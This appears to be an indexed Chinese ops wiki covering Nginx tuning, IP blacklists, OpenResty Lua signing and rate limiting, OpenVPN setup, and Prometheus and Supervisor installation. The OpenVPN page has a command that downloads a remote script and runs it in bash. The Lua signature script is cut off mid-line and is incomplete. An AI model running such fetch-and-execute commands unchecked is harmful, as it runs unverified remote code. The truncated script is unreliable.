conf.d/dtkcert/itgod.org.pem; ssl_certificate_key conf.d/dtkcert/itgod.org.key; include upstream.conf; include conf.d/*.conf; include testconfig/*.conf; include blocksip.conf; } 一个vhosts示例 server { listen 80; listen 443 ssl; server_name itgod.org; ssl_certificate conf.d/dtkcert/itgod.org.cn.pem; ssl_certificate_key conf.d/dtkcert/itgod.org.key; access_log /var/log/nginx/dtkapi.access.log json; error_log /var/log/nginx/dtkapi.error.log; include public/srcache.conf; include public/deny.conf; # 静态容灾实例配置 # set $srcache_v 0; # access_by_lua_file 'conf/conf.d/luascripts/srcache_random.lua'; # if ($uri ~ (/zs/|/pmc/|/pay/)) { # set $srcache_v 2; # } # if ($request_uri ~ \"_=[0-9]{10,13}$\") { # set $srcache_v 2; # } # set_md5 $mem_key $uri$args; # srcache_store PUT /memc $mem_key; # srcache_store_skip $srcache_v; # srcache_store_statuses 200 301 302; # srcache_response_cache_control off; # srcache_methods GET HEAD; # srcache_ignore_content_encoding on; # srcache_max_expire 10h; # # error_page 500 = @down_cache; # error_page 502 = @down_cache; # error_page 503 = @down_cache; # error_page 504 = @down_cache; # location = /memc { # internal; # # memc_connect_timeout 100ms; # memc_send_timeout 100ms; # memc_read_timeout 100ms; # memc_ignore_client_abort on; # # set $memc_key $query_string; # set $memc_exptime 36000; # # memc_pass memcached; # } # location @down_cache { # more_set_headers \"down-memcache: HIT\"; # access_log /var/log/nginx/downcache.dtkapi.dataoke.com.access.log json; # srcache_fetch GET /memc $mem_key; # } underscores_in_headers on; location ~^/dtk-order/ { more_set_headers \"Access-Control-Allow-Origin: *\"; more_set_headers \"Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE\"; more_set_headers \"Access-Control-Allow-Headers: *\"; more_set_headers \"Access-Control-Allow-Credentials: true\"; more_set_headers \"Access-Control-Expose-Headers: Content-Length,Access-Control-Allow-Origin,Access-Control-Allow-Headers,Content-Type\"; rewrite ^/aaaa/(.*) /$1 break; proxy_pass http://aaa; } } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/2.性能优化.html":{"url":"Nginx/2.性能优化.html","title":"2.性能优化","keywords":"","body":"性能优化 file-max 控制系统能打开的句柄数 ulimit 控制进程能打开的句柄数 修改linux单进程最大文件连接数 [root@ebs-41181 nginx]# vim /etc/security/limits.conf ##### 在文件最后加入如下内容 * soft nofile 102400 * hard nofile 102400 配置Nginx进程数量 worker_processes auto; 配置系统最大句柄数量 #当前会话生效 systemctl -w fs.file-max=2000000 #永久生效 echo 'fs.file-max=2000000' >> /etc/sysctl.conf 打开日志buffer缓冲，避免磁盘的频繁写入(以下配置表示日志达到32K后才写入磁盘,如果3秒内日志没有达到32K强制写入磁盘) access_log logs/access.log json buffer=32k flush=3s; 开启后端502重试，upstream池里某个节点502时会转发请求重试 proxy_next_upstream error http_502 timeout; proxy_next_upstream_tries 2; 长链接、打开文件缓存、客户端相关配置 open_file_cache max=10240 inactive=20s; open_file_cache_valid 30s; open_file_cache_min_uses 1; reset_timedout_connection on; keepalive_timeout 45s; keepalive_requests 2000; client_header_timeout 15s; client_body_timeout 15s; proxy_connect_timeout 5s; variables_hash_max_size 1024; server_tokens off; proxy_intercept_errors on; fastcgi_intercept_errors on; client_header_buffer_size 16k; large_client_header_buffers 4 32k; client_max_body_size 160m; server_names_hash_max_size 1024; server_names_hash_bucket_size 256; 打开gzip压缩，节约传输流量 gzip on; gzip_min_length 1k; gzip_buffers 16 8k; gzip_comp_level 6; gzip_types text/plain text/css application/x-javascript text/xml application/xml application/xml+rss text/javascript application/json application/javascript; gzip_vary on; gzip_proxied any; 去除客户顿啊header头中的Connection，指定为http1.1的长链接 proxy_redirect off ; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_set_header Host $host; 代理到后端时添加header头，获取客户端真实IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Request-Id $request_id; proxy_set_header x-b3-traceid $request_id; 扩展 查看当前系统打开句柄最大数量(默认为内存的10%，单位KB) `more /proc/sys/fs/file-max` >查看当前已经打开句柄总数 `lsof|awk '{print $2}'|wc -l` >根据打开文件句柄的数量降序排列，其中第二列为进程ID： `lsof|awk '{print $2}'|sort|uniq -c|sort -nr|more` Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/3.Nginx黑名单.html":{"url":"Nginx/3.Nginx黑名单.html","title":"3.Nginx黑名单","keywords":"","body":"Nginx黑名单用于限制指定的IP访问Nginx 1、在nginx.conf的http中加入黑名单配置文件： include website/blockip.conf; 例(在http下新增以下第4行)：http { include mime.types; default_type application/octet-stream; #新增内容 include website/blockip.conf; 2、然后在conf目录下，创建website/blockip.conf mkdir /usr/local/nginx/conf/website touch /usr/local/nginx/conf/website/blockip.conf 3、编辑blockip.conf文件，在blockip.conf中增加需要封禁的ip(将IP更改为需要禁用访问的IP)，我的配置如下: [root@nrffnginx-1 website]# pwd /usr/local/nginx/conf/website [root@nrffnginx-1 website]# cat blockip.conf deny 42.96.128.0/17; deny 42.120.0.0/16; deny 42.121.0.0/16; deny 42.156.128.0/17; deny 110.75.0.0/16; deny 110.76.0.0/19; deny 110.76.32.0/20; deny 110.76.48.0/20; deny 110.173.192.0/20; deny 110.173.208.0/20; ....此处省略 4、最后reload nginx即可生效: /usr/local/nginx/sbin/nginx -s reload Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/4.Nginx反向代理配置.html":{"url":"Nginx/4.Nginx反向代理配置.html","title":"4.Nginx反向代理配置","keywords":"","body":"1、在HTTP下创建代理池 #新增名为portal_service_poo的代理池，后端有3台服务器的8080端口提供服务，keepalived很重要，决定http长链接连接池 upstream portal_service_pool { server 10.215.1.1:8080 weight=1 max_fails=0 fail_timeout=0s;; keepalive 100; } 2、在server监听下添加代理转发配置 server { listen 8080; charset utf-8; } #指定访问IP URL时转发到portal池处理 location / { proxy_pass http://portal_service_pool; } #指定访问IP:/aaa URL时转发到aaa池处理 location /aaa{ # 去除aaa转发到后端 rewrite ^/aaa/(.*) /$1 break; proxy_pass http://aaa_service_pool; } } 3、上述配置讲解 1、假设Nginx本机地址为192.168.1.1，当用户访问192.168.1.1时，请求转发给了portal_service_pool池里的服务器:8080端口处理 2、upstream里weight决定权重、max_failts和fail_timeout决定最大错误次数和超时时间。keepalive决定http长链接的连接池（http1、http1.1、http2的区别自行了解） Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/5.location规则.html":{"url":"Nginx/5.location规则.html","title":"5.location规则","keywords":"","body":"Location规则和if判断 Location匹配优先级和实例 ``` = 严格匹配。如果这个查询匹配，那么将停止搜索并立即处理此请求。 ~ 为区分大小写匹配(可用正则表达式) !~为区分大小写不匹配 ~ 为不区分大小写匹配(可用正则表达式) !~为不区分大小写不匹配 ^~ 如果把这个前缀用于一个常规字符串,那么告诉nginx 如果路径匹配那么不测试正则表达式。 location = / { 只匹配 / 查询。 } location / { 匹配任何查询，因为所有请求都已 / 开头。但是正则表达式规则和长的块规则将被优先和查询匹配。 } location ^~ /p_w_picpaths/ { 匹配任何已 /p_w_picpaths/ 开头的任何查询并且停止搜索。任何正则表达式将不会被测试。 } location ~*.(gif|jpg|jpeg)$ { 匹配任何已 gif、jpg 或 jpeg 结尾的请求。 } location ~*.(gif|jpg|swf)$ { valid_referers none blocked start.igrow.cn sta.igrow.cn; if ($invalid_referer) { 防盗链 rewrite ^/ http://$host/logo.png; } } > if判断嵌套 > 例：根据uri的参数进行灰度流量控制，重写URI代理到upstream # 判断uri参数里appkey的参数以0-9、a-b结尾触发uri的rewrite规则，比如将请求/api/goods修改为/open-api/goods #最后的last表示修改URL后继续执行nginx文件，继续使用Nginx配置文件下面的Location匹配路由 if ($arg_appkey ~* ^(.*)([0-9|[a-b])$) { rewrite ^/api/goods?$ /open-api/goods last; } location ^~ /open-api/ { # go-open-api nginx proxy_pass http://openapiv2; } ``` Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/6.日志格式化.html":{"url":"Nginx/6.日志格式化.html","title":"6.日志格式化","keywords":"","body":"常用的日志格式化格式 log_format json '{ \"@timestamp\": \"$time_iso8601\", ' '\"remote_addr\": \"$remote_addr\", ' '\"referer\": \"$http_referer\", ' '\"request\": \"$request\", ' '\"status\": $status, ' '\"bytes\":$body_bytes_sent, ' '\"agent\": \"$http_user_agent\", ' '\"x_forwarded\": \"$http_x_forwarded_for\", ' '\"upstr_addr\": \"$upstream_addr\",' '\"upstr_host\": \"$upstream_http_host\",' '\"ups_resp_time\": \"$upstream_response_time\" }'; access_log logs/access.log json Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/7.反向代理获取真实IP.html":{"url":"Nginx/7.反向代理获取真实IP.html","title":"7.反向代理获取真实IP","keywords":"","body":"在server中添加3个字段，然后再程序中通过获取Header中的X-Forwarded-For取出真实客户端IP server { listen 8090; server_name localhost; root html/h5; location /api/registerAfter/ { proxy_pass http://127.0.0.1:2022/; } location /callback/ { proxy_pass http://127.0.0.1:5022/; } location / { try_files $uri $uri/ /; index index.html index.htm; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/8.嵌入Lua定制高级功能.html":{"url":"Nginx/8.嵌入Lua定制高级功能.html","title":"8.嵌入Lua定制高级功能","keywords":"","body":"openresty+Lua 验签、调用限流、埋点实战 功能描述 1、对用户的请求进行签名验证，放行合法请求 2、所有请求里，根据appkey查询uid，将uid带给后端使用，降低后端查库压力 3、 可以针对每个appkey、每个接口进行调用次数限制 实现逻辑 # 前置：我们已经将MySQL的某个用户表直接实时同步到了redis中使用hash存储 1、提取uri中的appkey参数 2、利用appkey查询Redis中存储的uid，放入header头。如果查询不到uid直接返回错误 3、利用appkey查询Redis中存储的的secret生成签名，对比用户的签名，完成签名认证，签名通过则放行整个到后端请求 4、 利用redis的数值加钱功能，完成调用次数加减 5、解析请求，整理埋点数据发送到kafka，用于大数据离线分析 生产环境使用使用结果： 1G内存redis主从版qps就能轻松破万， 万级qps下cpu使用率20%左右 vhosts文件引入lua server { server_name openapiv2.itgod.org; .. 省略 # rewrite阶段引入lua，获取用户UID rewrite_by_lua_file conf/lua/scripts/openapiv2_uid.lua; # location 匹配需要验证签名的接口 location ~ ^/(open-api/a|open-api/b){ # access阶段引入lua验证签名 access_by_lua_file conf/lua/scripts/openapiv2.lua; proxy_pass http://$openapipassto; } .. 省略 openapiv2_uid.lua文件（功能： 查询UID，整理请求为埋点信息推送到kafka） local cjson = require \"cjson\" local ngx_log = ngx.log local ngx_err = ngx.ERR local redis = require \"resty.redis\" local uri = ngx.var.uri local red = redis:new() local args = ngx.req.get_uri_args() local ngx_say = ngx.say local appkey = args[\"appkey\"] local mdw_prefix = \"mysql_to_redis_node1:dtk_users_application\" if not appkey then appkey = args[\"appKey\"] end if not appkey then ngx.exit(0) -- 添加默认key --local cdnignore = ngx.req.get_headers(1) --if cdnignore then --ngx_log(ngx_err, \"=====\" .. cdnignore[\"cdn-ignore\"]) --ngx_log(ngx_err, \"=====wu\") --args[\"appKey\"] = '61a622c6501' --ngx.req.set_uri_args(args) --args = ngx.req.get_uri_args() --appkey = args[\"appKey\"] --end end local mess_return = function(mess, s) if s == nil then ngx.status = 200 else ngx.status = s end ngx_say(cjson.encode(mess)) local r, err = red:set_keepalive(100000, 50) ngx.exit(0) end local find_uid = function() local res, err = red:hmget(mdw_prefix .. ':' .. appkey, \"uid\") if res then local r, err = red:set_keepalive(100000, 50) return res else local mess = {} mess[\"message\"] = \"appkey不存在\" mess_return(mess, 439) end end ngx.header['Content-Type'] = 'application/json; charset=utf-8' -- redis初始 red:set_timeout(100) local red_option = {} red_option[\"pool_size\"] = 50 red_option[\"backlog\"] = 100 local ok, err = red:connect(\"xxxxx.redis.rds.aliyuncs.com\", 6379, red_option) if not ok then ngx.exit(0) end -- uid local uid = find_uid() ngx.req.set_header(\"uid\", uid) ngx.header[\"uid\"] = uid ---BI local producer = require \"resty.kafka.producer\" local cjson = require \"cjson\" local uri = ngx.var.request_uri local x_forwarded_for = ngx.var.http_x_forwarded_for --local user_agent = ngx.var.http_user_agent local biToKafka = function() local message = {} local producer = require \"resty.kafka.producer\" local cjson = require \"cjson\" local uri = ngx.var.request_uri local x_forwarded_for = ngx.var.http_x_forwarded_for local request_method = ngx.var.request_method local message = {} local broker_list = { { host = \"192.168.13.45\", port = 9092 }, { host = \"192.168.13.46\", port = 9092 }, { host = \"192.168.13.47\", port = 9092 } } local params = {} message[\"apiName\"] = ngx.var.uri message[\"appKey\"] = args[\"appkey\"] message[\"flag\"] = 0 message[\"ip\"] = ngx.var.http_x_forwarded_for message[\"link\"] = ngx.var.request_uri for k, v in pairs(args) do params[k] = v end message[\"requestTime\"] = os.date(\"%Y-%m-%d %H:%M:%S\", os.time()) .. \".000\" message[\"params\"] = params message = cjson.encode(message) --ngx_log(ngx_err, message) local bp = producer:new(broker_list, { producer_type = \"async\" }) bp:send(\"test\", null, message) end biToKafka() openapiv2.lua文件（功能：查询secret，并验证签名和调用次数限制） local cjson = require \"cjson\" local ngx_log = ngx.log local ngx_err = ngx.ERR local redis = require \"resty.redis\" local uri = ngx.var.uri local red = redis:new() local args = ngx.req.get_uri_args() local ngx_say = ngx.say local timer = args[\"timer\"] local nonce = args[\"nonce\"] local appkey = args[\"appkey\"] local keywords = {\"总\", \"接口\"} local mdw_prefix = \"mysql_to_redis_node1:dtk_users_application\" local ill_count = 1000000000 local today_sub = ngx.today() ngx.header['Content-Type'] = 'application/json; charset=utf-8' local mess_return = function(mess, s) if s == nil then ngx.status = 200 else ngx.status = s end ngx_say(cjson.encode(mess)) local r, err = red:set_keepalive(100000, 100) ngx.exit(0) end if not appkey then appkey = args[\"appKey\"] end --if not appkey or not timer or not nonce then if not appkey then local mess = {} mess[\"message\"] = \"appkey必要参数缺失，请检查\" mess_return(mess, 200) end local redis_key = mdw_prefix .. \":\" .. appkey .. \":\" .. \"Nginx:\" .. today_sub local find_appsecret = function() --#local res, err = red:hmget(mdw_prefix .. ':' .. appkey, \"app_secret\", \"uid\") local res, err = red:hget(mdw_prefix .. ':' .. appkey, \"app_secret\") if res then return res else return end end local appkey_decr_hset = function(field) local res, err = red:hincrby(redis_key, field, -1) if not res then return end return res end local gen_md5token = function(appsecret) if appkey and timer and nonce and appsecret then local osTimer = os.time() * 1000 - 600000 if tonumber(timer) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/9.实现宕机静态容灾.html":{"url":"Nginx/9.实现宕机静态容灾.html","title":"9.实现宕机静态容灾","keywords":"","body":" openresty+lua+memcache 实现静态容灾 实现原理 1、正常情况下在openresty上通过srcache和lua随机取样10%的请求 并将请求返回体写入到memcache中 2、当后端异常时从缓存获取数据。实现方法：判断Nginx的upstream response status，将5xx状态码重定向到缓存获取数据 引用模块：https://github.com/openresty/srcache-nginx-module 配置： # 设置一个随机数，进行流量采样 set srcache_v 0; access_by_lua_file 'conf/conf.d/luascripts/srcache_random.lua'; #根据uri设置需要被缓存的路由 if (uri ~ (/tk_zs/|/pmc/|/pay/|/cloud/|/set/|/ucenters/|/kfpt/)) { set srcache_v 2; } if (request_uri ~ \"_=[0-9]{10,13}\") { setsrcache_v 2; } set_md5 mem_keyuriargs; srcache_store PUT /memcmem_key; srcache_store_skip srcache_v; srcache_store_statuses 200 301 302; srcache_response_cache_control off; srcache_methods GET HEAD; srcache_ignore_content_encoding on; srcache_max_expire 10h; error_page 500 = @down_cache; error_page 502 = @down_cache; error_page 503 = @down_cache; error_page 504 = @down_cache; location = /memc { internal; memc_connect_timeout 100ms; memc_send_timeout 100ms; memc_read_timeout 100ms; memc_ignore_client_abort on; setmemc_key query_string; setmemc_exptime 36000; # memcache地址 memc_pass memcached; } location @down_cache { more_set_headers \"down-memcache: HIT\"; access_log /var/log/nginx/downcache.www.itgod.org.access.log json; srcache_fetch GET /memc $mem_key; } lua随机采样脚本 ngx.var.srcache_v = math.random(0,9) --ngx.log(ngx.ERR, \"===============================\") --ngx.log(ngx.ERR, ngx.var.srcache_v) memcache的upstram upstream memcached { server m-xxxxxx.memcache.rds.aliyuncs.com:11211 weight=5 max_fails=0 fail_timeout=0s; keepalive 100; } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/Nginx限流.html":{"url":"Nginx/Nginx限流.html","title":"Nginx限流","keywords":"","body":"优势： Nginx限流可以针对客户端的IP进行请求速率限制，既能够强行保证请求的实时处理速度，又能防止恶意攻击或突发流量导致系统被压垮，提升系统的健壮性。 在http模块中新增配置limit_req_zone全局配置 在http模块中新增配置limit_req_zone,如下： http { include mime.types; default_type application/octet-stream; server_tokens off; limit_req_zone $binary_remote_addr zone=mylimit:10m rate=2r/s; $binary_remote_addr表示根据remote_addr变量的值进行限制 zone=mylimit:10m 表示一个大小为10M，名字为myRateLimit的内存区域，根据官方描述，1M的内存大约可以存储16000个IP地址，10M则可以存储约16万IP地址，可以根据实际情况调整 rater=2r/s 表示限制每秒2个请求，Nginx 实际上以毫秒为粒度来跟踪请求信息，因此 2r/s 实际上是限制：每500毫秒处理一个请求。这意味着，自上一个请求处理完后，若后续500毫秒内又有请求到达，将拒绝处理该请求，默认返回503错误码，该错误码可以自定义。 在server中调用limit_req_zone 例： server { listen 8089; server_name localhost; root html/shigongbao; autoindex on; limit_req zone=mylimit burst=4 nodelay; location / { index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } zone=mylimit 表示调用http全局模块中定义的limit_req_zone zone名 burst=4 表示缓冲区突然流量处理，在超过设定的处理速率后能额外处理的请求数。当 rate=2r/s 时，将1s拆成2份，即每500ms可处理1个请求。 当同时有10个请求到达时，rate=2 立刻转发了2个请求到后端服务器，burst=4 缓存或立刻转发了4个请求（是否立刻转发主要看nodelay参数），丢弃了4个请求 Nodelay 针对的是burst参数，burst=4 nodelay 表示这4个请求立马处理，不能延迟，相当于特事特办。不过，即使这4个突发请求立马处理结束，后续来了请求也不会立马处理。burst=4 相当于缓存队列中占了4个坑，即使请求被处理了，这4个位置这只能按 500ms一个来释放。 执行ab压力测试 上述配置中rate=2r/s，burst=4，推理出第1秒可以一次性处理5个请求（因为rate=2 500毫秒内的第二个请求会被丢弃） 一次性发送5个请求测试结果，Failed requests: 0 [root@cs2 Yearning-go]# ab -n 5 -c 5 http://192.168.1.30:8089/ This is ApacheBench, Version 2.3 Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 192.168.1.30 (be patient).....done Server Software: nginx Server Hostname: 192.168.1.30 Server Port: 8089 Document Path: / Document Length: 394 bytes Concurrency Level: 5 Time taken for tests: 0.002 seconds Complete requests: 5 Failed requests: 0 Write errors: 0 Total transferred: 2545 bytes HTML transferred: 1970 bytes Requests per second: 2019.39 [#/sec] (mean) Time per request: 2.476 [ms] (mean) Time per request: 0.495 [ms] (mean, across all concurrent requests) Transfer rate: 1003.78 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 0 0 0.0 0 1 Processing: 1 1 0.1 1 1 Waiting: 1 1 0.1 1 1 Total: 1 1 0.1 1 1 Percentage of the requests served within a certain time (ms) 50% 1 66% 1 75% 1 80% 1 90% 1 95% 1 98% 1 99% 1 100% 1 (longest request) 一次性发送6个请求测试结果，有一个请求被丢弃，Failed requests: 1 [root@cs2 Yearning-go]# ab -n 6 -c 6 http://192.168.1.30:8089/ This is ApacheBench, Version 2.3 Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 192.168.1.30 (be patient).....done Server Software: nginx Server Hostname: 192.168.1.30 Server Port: 8089 Document Path: / Document Length: 394 bytes Concurrency Level: 6 Time taken for tests: 0.018 seconds Complete requests: 6 Failed requests: 1 (Connect: 0, Receive: 0, Length: 1, Exceptions: 0) Write errors: 0 Non-2xx responses: 1 Total transferred: 3226 bytes HTML transferred: 2464 bytes Requests per second: 328.62 [#/sec] (mean) Time per request: 18.258 [ms] (mean) Time per request: 3.043 [ms] (mean, across all concurrent requests) Transfer rate: 172.55 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 4 5 0.3 5 5 Processing: 5 5 0.0 5 5 Waiting: 5 5 0.1 5 5 Total: 9 9 0.3 10 10 ERROR: The median and mean for the total time are more than twice the standard deviation apart. These results are NOT reliable. Percentage of the requests served within a certain time (ms) 50% 10 66% 10 75% 10 80% 10 90% 10 95% 10 98% 10 99% 10 100% 10 (longest request) Nginx error日志记录被丢弃的包如下： 2020/07/29 16:00:08 [error] 4471#0: *895 limiting requests, excess: 4.982 by zone \"mylimit\", client: 192.168.1.40, server: localhost, request: \"GET / HTTP/1.0\", host: \"192.168.1.30:8089\" 生产环境限流实战案例 1、首先在nginx.conf的http块下申明内存空间 http { error_log /var/log/nginx/error.log; access_log /var/log/nginx/access.log; charset utf-8; include mime.types; default_type application/octet-stream; # 限流过程中有IP大客户，为大客户单独设置为限流IP白名单 geo $whiteIpList { default 1; 59.110.139.118 0; 101.133.138.27 0; } map $whiteIpList $binary_remote_addr_limit { 1 $binary_remote_addr; 0 \"\"; } # 分别为域名、uri中的appkey、客户端二进制IP地址设置不同的zone，不同的rate速度限制 limit_req_zone $http_host zone=open_api_domain:50m rate=2500r/s; limit_req_zone $arg_appkey zone=open_api_appkey:50m rate=200r/s; limit_req_zone $binary_remote_addr zone=zone_web_tmp:50m rate=5r/s; limit_req_zone $binary_remote_addr zone=zone_web:50m rate=50r/s; limit_req_zone $binary_remote_addr zone=zone_web_yjtg:50m rate=30r/s; limit_req_zone $binary_remote_addr_limit zone=zone_open_api:50m rate=40r/s; ... 省略 2、在域名的独立vhosts文件中申明使用哪个zone server { server_name openapi.itgod.org; listen 80; listen 443 ssl; access_log /var/log/nginx/openapi.itgod.org.access.log json; error_log /var/log/nginx/openapi.itgod.org.error.log; # 使用域名限制，设置burst预防突发流量，突发流量nodelay 0 延迟发送 limit_req zone=open_api_domain burst=50 nodelay; limit_req zone=open_api_appkey burst=100 nodelay; limit_req zone=zone_open_api burst=30 nodelay; limit_req_status 429; #more_set_headers \"Debug-For-Yxd: $arg_appkey\"; ....省略 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"OpenVPN部署/":{"url":"OpenVPN部署/","title":"OpenVPN部署","keywords":"","body":"openvpn 一键部署，脚本来源https://github.com/Nyr/openvpn-install Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"OpenVPN部署/OPenVPN部署.html":{"url":"OpenVPN部署/OPenVPN部署.html","title":"OPenVPN部署","keywords":"","body":" 一键安装脚本来源：https://github.com/Nyr/openvpn-install 安装 wget https://git.io/vpn -O openvpn-install.sh && bash openvpn-install.sh 安装选项 Welcome to this OpenVPN road warrior installer! Which IPv4 address should be used? 1) 172.16.2.155 2) 172.18.0.1 3) 172.17.0.1 This server is behind NAT. What is the public IPv4 address or hostname? Which protocol should OpenVPN use? 1) UDP (recommended) 2) TCP What port should OpenVPN listen to? Select a DNS server for the clients: 1) Current system resolvers 2) Google 3) 1.1.1.1 4) OpenDNS 5) Quad9 6) AdGuard Using SSL: openssl OpenSSL 1.0.2k-fips 26 Jan 2017 Using SSL: openssl OpenSSL 1.0.2k-fips 26 Jan 2017 Using SSL: openssl OpenSSL 1.0.2k-fips 26 Jan 2017 An updated CRL has been created. CRL file: /etc/openvpn/server/easy-rsa/pki/crl.pem .............................. Finished! The client configuration is available in: /root/yongxiaodong.ovpn New clients can be added by running this script again. 以上执行完成后就自动启动了openVPN服务，ovpn 客户端配置在/root/目录下，配置文件在/etc/openvpn/目录中 windows客户端安装使用（详细使用方法见11. 远程管理方式） 客户端下载url：https://swupdate.openvpn.org/community/releases/openvpn-install-2.4.8-I602-Win10.exe 下载后安装，并将 服务器上 \"用户.ovpn\" 文件 copy到客户端安装目录中的config目录即可使用（用户.ovpn文件是通过重新执行openvpn-install.sh中新增用户获得） Linux客户端安装使用： yum install epel-release yum install openvpn 将 .ovpn 文件放置/etc/openvpn/connect_aliyun目录中 Linux客户端启动 nohup openvpn /etc/openvpn/connect_aliyun/test_environment.ovpn > /etc/openvpn/connect_aliyun/log.log & openvpn /etc/*.ovpn openvopenvpn /etc/.ovpnpn /etc/.ovpn openvpn /etc/*.ovpn openvpn /etc/*.ovpn 安装完成后的调优 （非必须，根据实际情况调整，以下是我实际应用中整理的优化方案） server.conf 优化 local 172.16.2.155 port 1194 proto udp dev tun ca ca.crt cert server.crt key server.key dh dh.pem auth SHA512 tls-crypt tc.key topology subnet server 10.8.0.0 255.255.255.0 #push \"redirect-gateway def1 bypass-dhcp\" # 此行如果不禁用，客户端所有的流量均会通过openVPN代理，为了提高实际使用体验，禁用此行，并在下面自定义需要通过openVPN走的的路由 ifconfig-pool-persist ipp.txt push \"dhcp-option DNS 100.100.2.136\" # 此处两行表示要客户端vpn拨号后，推送这两个DNS给客户端，根据实际情况配置，也可以使用公共DNS push \"dhcp-option DNS 100.100.2.138\" keepalive 10 120 cipher AES-256-CBC user nobody group nobody persist-key persist-tun status openvpn-status.log verb 3 crl-verify crl.pem explicit-exit-notify # 以下路由是根据我的实际环境中需要通过openVPN经过的流，第一条表示172.16.0.0/16网段流量通过openVPN代理，后面两条是DNS(配置的阿里云的DNS，方便通过阿里云内网域名链接RDS等) push \"route 172.16.0.0 255.255.0.0 vpn_gateway\" push \"route 100.100.2.136 255.255.255.255 vpn_gateway\" push \"route 100.100.2.138 255.255.255.255 vpn_gateway\" client-common.txt优化 client dev tun proto udp remote 47.108.25.212 1194 resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server auth SHA512 cipher AES-256-CBC #ignore-unknown-option block-outside-dns # 经测试如果不禁用这两行，客户端拨号后无法使用DNS解析 #block-outside-dns verb 3 最后 修改完配置文件要重启进程（systemctl restart openvpn-server@server） 在执行安装脚本的时候创建的用户.ovpn配置中会包含gnore-unknown-option block-outside-dns配置，需要手动编辑取消，否则DNS解析无效 删除、新增用户，重新执行安装脚本openvpn-install.sh即可 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Prometheus+Grafana/":{"url":"Prometheus+Grafana/","title":"Prometheus Grafana","keywords":"","body":"Prometheus+grafana实践 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Prometheus+Grafana/Grafana.html":{"url":"Prometheus+Grafana/Grafana.html","title":"Grafana","keywords":"","body":" mkdir -p /usr/local/prometheus cd !$ Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Prometheus+Grafana/Prometheus_grafana.html":{"url":"Prometheus+Grafana/Prometheus_grafana.html","title":"Prometheus Grafana","keywords":"","body":"安装Prometheus mkdir -p /usr/local/prometheus cd !$ wget https://github-production-release-asset-2e65be.s3.amazonaws.com/6838921/88308200-b7b7-11ea-826b-4c99718171b7?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200701%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200701T013729Z&X-Amz-Expires=300&X-Amz-Signature=184dd8769f1e3c9d170f1dcc35754e48ee4e6936d106e5cabc17ec75eb63f74a&X-Amz-SignedHeaders=host&actor_id=23717585&repo_id=6838921&response-content-disposition=attachment%3B%20filename%3Dprometheus-2.19.2.linux-amd64.tar.gz&response-content-type=application%2Foctet-stream tar xf prometheus-2.19.2.linux-amd64.tar.gz mv prometheus-2.19.2.linux-amd64 prometheus 安装grafana wget https://dl.grafana.com/oss/release/grafana-7.0.5.linux-amd64.tar.gz mv grafana-7.0.5 grafana Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Prometheus+Grafana/Supervisior管理进程.html":{"url":"Prometheus+Grafana/Supervisior管理进程.html","title":"Supervisior管理进程","keywords":"","body":"安装 README.md 进程管理 写入supervisord.conf 配置文件（文件为我自己总结的，根据需要修改） cat /etc/supervisord.conf [unix_http_server] file=/var/log/supervisor/supervisor.sock ; the path to the socket file ;chmod=0700 ; socket file mode (default 0700) ;chown=nobody:nogroup ; socket file uid:gid owner ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) ;[inet_http_server] ; inet (TCP) server disabled by default ;port=127.0.0.1:9001 ; ip_address:port specifier, *:port for all iface ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisord] logfile=/var/log/supervisor/supervisord.log ; main log file; default $CWD/supervisord.log logfile_maxbytes=50MB ; max main logfile bytes b4 rotation; default 50MB logfile_backups=10 ; # of main logfile backups; 0 means none, default 10 loglevel=info ; log level; default info; others: debug,warn,trace pidfile=/var/log/supervisor/supervisord.pid ; supervisord pidfile; default supervisord.pid nodaemon=false ; start in foreground if true; default false silent=false ; no logs to stdout if true; default false minfds=65535 ; min. avail startup file descriptors; default 1024 